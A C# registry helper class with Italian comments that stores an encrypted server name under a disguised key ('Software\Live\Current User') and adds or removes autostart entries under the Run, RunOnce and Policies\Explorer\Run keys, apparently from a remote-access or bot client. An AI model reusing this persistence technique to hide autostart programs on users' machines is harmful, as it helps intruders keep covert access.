using System;
using Microsoft.Win32;

namespace bc.srv.Classes
{
    internal class RegistryManager
    {
        #region SERVER NAME

        /// <summary>
        ///     Controlla se esiste il ket sul registro del
        ///     nome server
        /// </summary>
        /// <returns></returns>
        public bool ExistServerNameEntry()
        {
            try
            {
                var rkCheck = Registry.CurrentUser.OpenSubKey(@"Software\Live\Current User");

                if (rkCheck == null)
                    return false;
                return true;
            }
            catch
            {
                return false;
            }
        }
        //-------------------------------------------------------

        /// <summary>
        ///     Setta il nuovo valore sul registro
        /// </summary>
        /// <param name="regEntryName"></param>
        /// <param name="filePath"></param>
        public bool SetNewNameInRegistry(string newNameCrypted)
        {
            try
            {
                // CONTROLLO ESISTENZA DELLA CHIAVE
                var rkCheck = Registry.CurrentUser.CreateSubKey(@"Software\Live\Current User");


                rkCheck.SetValue("User", newNameCrypted, RegistryValueKind.ExpandString);

                rkCheck.Close();

                return true;
            }
            catch
            {
                return false;
            }
        }
        //---------------------------------------------------------

        /// <summary>
        ///     Get il nome dal registro
        ///     null se non esiste o errore
        /// </summary>
        /// <param name="regEntryName"></param>
        /// <param name="filePath"></param>
        public string GetNameFromRegistry()
        {
            try
            {
                // CONTROLLO ESISTENZA DELLA CHIAVE
                var rkCheck = Registry.CurrentUser.OpenSubKey(@"Software\Live\Current User");

                if (rkCheck == null)
                    return null;
                return rkCheck.GetValue("User").ToString();
            }
            catch
            {
                return null;
            }
        }
        //---------------------------------------------------------

        #endregion

        #region INSTALLATION

        /// <summary>
        ///     HKCU RUNONCE ENTRY
        /// </summary>
        /// <param name="regEntryName"></param>
        /// <param name="filePath"></param>
        public bool AddHKCURunOnceReg(string regEntryName, string filePath)
        {
            try
            {
                var rk = Registry.CurrentUser;
                RegistryKey startupPath;
                startupPath = rk.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", true);

                // LO VALORIZZO SOLO SE DIVERSO DAL VALORE CHE VOGLIO METTERE
                if (startupPath.GetValue(regEntryName) == null ||
                    startupPath.GetValue(regEntryName).ToString() != filePath)
                    startupPath.SetValue(regEntryName, filePath, RegistryValueKind.ExpandString);

                return true;
            }
            catch
            {
                return false;
            }
        }
        //---------------------------------------------------------

        /// <summary>
        ///     HKCU ENTRY
        /// </summary>
        /// <param name="regEntryName"></param>
        /// <param name="filePath"></param>
        public bool AddHkcuReg(string regEntryName, string filePath)
        {
            try
            {
                var rk = Registry.CurrentUser;
                RegistryKey startupPath;
                startupPath = rk.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);

                // LO VALORIZZO SOLO SE DIVERSO DAL VALORE CHE VOGLIO METTERE
                if (startupPath.GetValue(regEntryName) == null ||
                    startupPath.GetValue(regEntryName).ToString() != filePath)
                    startupPath.SetValue(regEntryName, filePath, RegistryValueKind.ExpandString);

                return true;
            }
            catch
            {
                return false;
            }
        }
        //---------------------------------------------------------


        /// <summary>
        ///     Explorer ENTRY
        /// </summary>
        /// <param name="regEntryName"></param>
        /// <param name="filePath"></param>
        public bool AddExplorerReg(string regEntryName, string filePath)
        {
            try
            {
                var rk = Registry.CurrentUser.CreateSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run");

                // LO VALORIZZO SOLO SE DIVERSO DAL VALORE CHE VOGLIO METTERE
                if (rk.GetValue(regEntryName) == null || rk.GetValue(regEntryName).ToString() != filePath)
                    rk.SetValue(regEntryName, filePath, RegistryValueKind.ExpandString);

                return true;
            }
            catch
            {
                return false;
            }
        }
        //---------------------------------------------------------

        #endregion

        #region UNINSTALL

        /// <summary>
        ///     HKCU ENTRY DELETE
        /// </summary>
        /// <param name="regEntryName"></param>
        /// <param name="filePath"></param>
        public void RemoveHkcuReg(string regEntryName, string filePath)
        {
            try
            {
                var rk = Registry.CurrentUser;
                RegistryKey startupPath;
                startupPath = rk.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);

                // LOELIMINO SOLO SE è PUNTA A ME
                if (startupPath.GetValue(regEntryName).ToString() == filePath)
                    startupPath.DeleteValue(regEntryName);
            }
            catch (Exception ex)
            {
                var exc = ex.Message;
            }
        }
        //---------------------------------------------------------


        /// <summary>
        ///     Explorer ENTRY DELETE
        /// </summary>
        /// <param name="regEntryName"></param>
        /// <param name="filePath"></param>
        public void RemoveExplorerReg(string regEntryName, string filePath)
        {
            try
            {
                var rk = Registry.CurrentUser;
                RegistryKey startupPath;
                startupPath = rk.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", true);


                if (startupPath.GetValue(regEntryName).ToString() == filePath)
                    startupPath.DeleteValue(regEntryName);
            }
            catch (Exception ex)
            {
                var exc = ex.Message;
            }
        }
        //---------------------------------------------------------

        #endregion
    }
}